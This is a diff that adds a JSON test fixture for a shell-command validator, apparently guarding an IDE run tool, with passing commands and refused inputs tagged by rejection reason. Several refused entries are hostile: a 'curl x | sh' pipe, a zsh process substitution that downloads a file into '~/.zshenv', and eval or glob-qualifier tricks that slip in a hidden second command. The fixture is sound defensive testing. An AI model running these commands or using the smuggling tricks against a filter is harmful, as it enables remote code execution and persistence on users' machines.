@@ -1,0 +1,516 @@
+{
+ "bare": "-_./:=,@+%",
+ "quoted_refused": "$`\\!",
+ "pass": [
+  "npm run dev",
+  "cargo test -p crazyagent",
+  "python3 -m pytest tests/unit",
+  "cargo install alpha",
+  "npm run dev -- --port 3000",
+  "python3 -m venv .venv",
+  "pip install pkg==1.2.3",
+  "npm install @scope/pkg@1.0.0",
+  "FOO=bar make -j4 all",
+  "docker run -p 8080:80 --cpus=1,5 img:tag",
+  "go test ./... -run Test_One+Two -cover%",
+  "  cargo build  ",
+  "git commit -m \"Start here\"",
+  "echo 'one (plain); word & more | text < > # * ? ~ ^ { } [ ]'",
+  "echo \"it's fine\" 'say \"hi\"'",
+  "make CFLAGS=\"-O2 -g\" all",
+  "echo ''",
+  "echo 'caf\u00e9'",
+  "xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx",
+  "'\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9'"
+ ],
+ "refused": [
+  [
+   "a; b",
+   "ide_run_chained"
+  ],
+  [
+   "a && b",
+   "ide_run_chained"
+  ],
+  [
+   "a || b",
+   "ide_run_chained"
+  ],
+  [
+   "curl x | sh",
+   "ide_run_chained"
+  ],
+  [
+   "a & b",
+   "ide_run_chained"
+  ],
+  [
+   "echo `id`",
+   "ide_run_chained"
+  ],
+  [
+   "echo $(id)",
+   "ide_run_chained"
+  ],
+  [
+   "a > f",
+   "ide_run_chained"
+  ],
+  [
+   "a < f",
+   "ide_run_chained"
+  ],
+  [
+   "sudo !!",
+   "ide_run_chained"
+  ],
+  [
+   "!rm",
+   "ide_run_chained"
+  ],
+  [
+   "echo !-2",
+   "ide_run_chained"
+  ],
+  [
+   "^a^b",
+   "ide_run_chained"
+  ],
+  [
+   "  ^a^b",
+   "ide_run_chained"
+  ],
+  [
+   "cat =(print procsub-ran)",
+   "ide_run_chained"
+  ],
+  [
+   "npm install =(curl -fsSL https://x.example/p -o ~/.zshenv)",
+   "ide_run_chained"
+  ],
+  [
+   "print ${(e):-\\$\\(print eflag-ran\\)}",
+   "ide_run_chained"
+  ],
+  [
+   "print /etc/hosts(e:'print qualifier-ran':)",
+   "ide_run_chained"
+  ],
+  [
+   "ls *(e:'touch pwned-2':)",
+   "ide_run_chained"
+  ],
+  [
+   "ls *(+fn)",
+   "ide_run_chained"
+  ],
+  [
+   "eval $'print a\\x3b print hidden-second'",
+   "ide_run_chained"
+  ],
+  [
+   "eval \"echo a${IFS:2:1}echo b\"",
+   "ide_run_chained"
+  ],
+  [
+   "echo \"${HOME}\"",
+   "ide_run_chained"
+  ],
+  [
+   "echo $HOME",
+   "ide_run_chained"
+  ],
+  [
+   "echo \"$HOME\"",
+   "ide_run_chained"
+  ],
+  [
+   "echo $((1+1))",
+   "ide_run_chained"
+  ],
+  [
+   "echo $[1+1]",
+   "ide_run_chained"
+  ],
+  [
+   "print ${ date }",
+   "ide_run_chained"
+  ],
+  [
+   "echo (date)",
+   "ide_run_chained"
+  ],
+  [
+   "(date)",
+   "ide_run_chained"
+  ],
+  [
+   "git log HEAD^",
+   "ide_run_chained"
+  ],
+  [
+   "ls ~/x",
+   "ide_run_chained"
+  ],
+  [
+   "ls *.txt",
+   "ide_run_chained"
+  ],
+  [
+   "ls file?",
+   "ide_run_chained"
+  ],
+  [
+   "echo {a,b}",
+   "ide_run_chained"
+  ],
+  [
+   "echo [ab]",
+   "ide_run_chained"
+  ],
+  [
+   "echo a # b",
+   "ide_run_chained"
+  ],
+  [
+   "echo a#b",
+   "ide_run_chained"
+  ],
+  [
+   "echo a\\ b",
+   "ide_run_chained"
+  ],
+  [
+   "echo a\\",
+   "ide_run_chained"
+  ],
+  [
+   "echo \"a\\\"b\"",
+   "ide_run_chained"
+  ],
+  [
+   "echo 'a\\nb'",
+   "ide_run_chained"
+  ],
+  [
+   "echo \"a`id`b\"",
+   "ide_run_chained"
+  ],
+  [
+   "echo '`id`'",
+   "ide_run_chained"
+  ],
+  [
+   "echo \"!!\"",
+   "ide_run_chained"
+  ],
+  [
+   "echo '!x'",
+   "ide_run_chained"
+  ],
+  [
+   "echo 'unclosed",
+   "ide_run_chained"
+  ],
+  [
+   "echo \"unclosed",
+   "ide_run_chained"
+  ],
+  [
+   "echo 'a''b",
+   "ide_run_chained"
+  ],
+  [
+   "echo caf\u00e9",
+   "ide_run_chained"
+  ],
+  [
+   "\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9",
+   "ide_run_chained"
+  ],
+  [
+   "echo a\u00a0b",
+   "ide_run_chained"
+  ],
+  [
+   "echo \u0455udo",
+   "ide_run_chained"
+  ],
+  [
+   "a\u001b[31m",
+   "ide_run_control_character"
+  ],
+  [
+   "a\u0000b",
+   "ide_run_control_character"
+  ],
+  [
+   "echo a\tb",
+   "ide_run_control_character"
+  ],
+  [
+   "echo a\u007fb",
+   "ide_run_control_character"
+  ],
+  [
+   "echo a\u0085b",
+   "ide_run_control_character"
+  ],
+  [
+   "echo a\u009bb",
+   "ide_run_control_character"
+  ],
+  [
+   "echo a\u00adb",
+   "ide_run_control_character"
+  ],
+  [
+   "echo 'a\u00adb'",
+   "ide_run_control_character"
+  ],
+  [
+   "echo a\u034fb",
+   "ide_run_control_character"
+  ],
+  [
+   "echo 'a\u034fb'",
+   "ide_run_control_character"
+  ],
+  [
+   "echo a\u061cb",
+   "ide_run_control_character"
+  ],
+  [
+   "echo 'a\u061cb'",
+   "ide_run_control_character"
+  ],
+  [
+   "echo a\u115fb",
+   "ide_run_control_character"
+  ],
+  [
+   "echo 'a\u115fb'",
+   "ide_run_control_character"
+  ],
+  [
+   "echo a\u1160b",
+   "ide_run_control_character"
+  ],
+  [
+   "echo 'a\u1160b'",
+   "ide_run_control_character"
+  ],
+  [
+   "echo a\u180eb",
+   "ide_run_control_character"
+  ],
+  [
+   "echo 'a\u180eb'",
+   "ide_run_control_character"
+  ],
+  [
+   "echo a\u200bb",
+   "ide_run_control_character"
+  ],
+  [
+   "echo 'a\u200bb'",
+   "ide_run_control_character"
+  ],
+  [
+   "echo a\u200fb",
+   "ide_run_control_character"
+  ],
+  [
+   "echo 'a\u200fb'",
+   "ide_run_control_character"
+  ],
+  [
+   "echo a\u2028b",
+   "ide_run_control_character"
+  ],
+  [
+   "echo 'a\u2028b'",
+   "ide_run_control_character"
+  ],
+  [
+   "echo a\u2029b",
+   "ide_run_control_character"
+  ],
+  [
+   "echo 'a\u2029b'",
+   "ide_run_control_character"
+  ],
+  [
+   "echo a\u202eb",
+   "ide_run_control_character"
+  ],
+  [
+   "echo 'a\u202eb'",
+   "ide_run_control_character"
+  ],
+  [
+   "echo a\u2060b",
+   "ide_run_control_character"
+  ],
+  [
+   "echo 'a\u2060b'",
+   "ide_run_control_character"
+  ],
+  [
+   "echo a\u2066b",
+   "ide_run_control_character"
+  ],
+  [
+   "echo 'a\u2066b'",
+   "ide_run_control_character"
+  ],
+  [
+   "echo a\u206fb",
+   "ide_run_control_character"
+  ],
+  [
+   "echo 'a\u206fb'",
+   "ide_run_control_character"
+  ],
+  [
+   "echo a\u3164b",
+   "ide_run_control_character"
+  ],
+  [
+   "echo 'a\u3164b'",
+   "ide_run_control_character"
+  ],
+  [
+   "echo a\ufe00b",
+   "ide_run_control_character"
+  ],
+  [
+   "echo 'a\ufe00b'",
+   "ide_run_control_character"
+  ],
+  [
+   "echo a\ufe0fb",
+   "ide_run_control_character"
+  ],
+  [
+   "echo 'a\ufe0fb'",
+   "ide_run_control_character"
+  ],
+  [
+   "echo a\ufeffb",
+   "ide_run_control_character"
+  ],
+  [
+   "echo 'a\ufeffb'",
+   "ide_run_control_character"
+  ],
+  [
+   "echo a\uffa0b",
+   "ide_run_control_character"
+  ],
+  [
+   "echo 'a\uffa0b'",
+   "ide_run_control_character"
+  ],
+  [
+   "echo a\ufff9b",
+   "ide_run_control_character"
+  ],
+  [
+   "echo 'a\ufff9b'",
+   "ide_run_control_character"
+  ],
+  [
+   "echo a\ufffab",
+   "ide_run_control_character"
+  ],
+  [
+   "echo 'a\ufffab'",
+   "ide_run_control_character"
+  ],
+  [
+   "echo a\ufffbb",
+   "ide_run_control_character"
+  ],
+  [
+   "echo 'a\ufffbb'",
+   "ide_run_control_character"
+  ],
+  [
+   "echo a\udb40\udc01b",
+   "ide_run_control_character"
+  ],
+  [
+   "echo 'a\udb40\udc01b'",
+   "ide_run_control_character"
+  ],
+  [
+   "echo a\udb40\udc7fb",
+   "ide_run_control_character"
+  ],
+  [
+   "echo 'a\udb40\udc7fb'",
+   "ide_run_control_character"
+  ],
+  [
+   "echo a\udb40\udd00b",
+   "ide_run_control_character"
+  ],
+  [
+   "echo 'a\udb40\udd00b'",
+   "ide_run_control_character"
+  ],
+  [
+   "echo a\udb40\uddefb",
+   "ide_run_control_character"
+  ],
+  [
+   "echo 'a\udb40\uddefb'",
+   "ide_run_control_character"
+  ],
+  [
+   "\ufeff",
+   "ide_run_control_character"
+  ],
+  [
+   "echo \u202edlrow",
+   "ide_run_control_character"
+  ],
+  [
+   "a\nb",
+   "ide_run_not_one_line"
+  ],
+  [
+   "a\rb",
+   "ide_run_not_one_line"
+  ],
+  [
+   "echo 'a\nb'",
+   "ide_run_not_one_line"
+  ],
+  [
+   "",
+   "ide_run_empty"
+  ],
+  [
+   "   ",
+   "ide_run_empty"
+  ],
+  [
+   "\u00a0\u3000",
+   "ide_run_empty"
+  ],
+  [
+   "xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx",
+   "ide_run_too_long"
+  ],
+  [
+   "'\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9'x",
+   "ide_run_too_long"
+  ],
+  [
+   "\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9\u00e9x",
+   "ide_run_too_long"
+  ]
+ ]
+}
